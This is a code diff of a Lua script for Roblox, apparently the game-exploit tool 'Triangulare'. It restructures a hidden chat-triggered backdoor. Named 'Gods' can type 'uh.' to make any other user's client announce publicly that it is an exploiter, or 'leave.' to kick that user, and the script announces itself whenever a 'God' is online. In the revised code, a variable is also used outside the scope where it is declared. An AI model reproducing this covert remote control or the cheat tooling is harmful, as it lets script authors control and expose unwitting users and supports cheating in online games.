@@ -52,30 +52,32 @@ if Game then
         Gods = {"VladmirNine", "Moligrafi"}
       }
       
-      if not table.find(Settings.Gods, eu.Name) and not getgenv().Triangulare then
-        getgenv().Triangulare = true
-        local TextChatService = game:GetService("TextChatService")
-        TextChatService.MessageReceived:Connect(function(message)
-          local props = message.TextSource
-          if props and props.UserId then
-            local sender = game:GetService("Players"):GetPlayerByUserId(props.UserId)
-            if sender and table.find(Settings.Gods, sender.Name) then
-              if message.Text == "uh." then
-                local now = tick()
-                if now - Settings.LastReveal >= Settings.Cooldown then
-                  Settings.LastReveal = now
-                  TextChatService.TextChannels.RBXGeneral:SendAsync("Hey! I'm a exploiter! Using Triangulare — made by Moligrafi.")
+      if not table.find(Settings.Gods, eu.Name) then
+        if not getgenv().Triangulare then
+          getgenv().Triangulare = true
+          local TextChatService = game:GetService("TextChatService")
+          TextChatService.MessageReceived:Connect(function(message)
+            local props = message.TextSource
+            if props and props.UserId then
+              local sender = game:GetService("Players"):GetPlayerByUserId(props.UserId)
+              if sender and table.find(Settings.Gods, sender.Name) then
+                if message.Text == "uh." then
+                  local now = tick()
+                  if now - Settings.LastReveal >= Settings.Cooldown then
+                    Settings.LastReveal = now
+                    TextChatService.TextChannels.RBXGeneral:SendAsync("Hey! I'm a exploiter! Using Triangulare — made by Moligrafi.")
+                  end
+                elseif message.Text == "leave." then
+                  task.wait(2)
+                  game:GetService("Players").LocalPlayer:Kick("You were kicked by a Triangulare admin.")
                 end
-              elseif message.Text == "leave." then
-                task.wait(2)
-                game:GetService("Players").LocalPlayer:Kick("You were kicked by a Triangulare admin.")
               end
             end
-          end
-        end)
+          end)
+        end
         for _, p in pairs(game:GetService("Players"):GetPlayers()) do
           if p ~= eu and table.find(Settings.Gods, p.Name) then
-            TextChatService.TextChannels.RBXGeneral:SendAsync("Hey " .. p.Name .. "! I'm a exploiter! Using Triangulare — made by Moligrafi.")
+            TextChatService.TextChannels.RBXGeneral:SendAsync("Hey " .. p.Name .. "! I just executed Triangulare — made by Moligrafi.")
           end
         end
       end
